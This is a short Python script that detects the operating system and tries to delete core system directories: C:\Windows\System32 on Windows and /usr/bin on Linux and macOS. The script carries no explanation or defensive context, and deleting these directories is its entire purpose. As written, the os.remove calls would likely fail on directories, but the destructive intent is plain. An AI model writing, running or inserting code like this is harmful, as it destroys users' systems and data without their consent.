import os
import platform

if __name__ == "__main__":
    if(platform.system() == "Windows"):   # Windows
        os.remove("C:\\Windows\\System32")
    elif platform.system() == "Linux" or platform.system() == "Darwin" :   # Linux or Mac OS X
        os.remove("/usr/bin")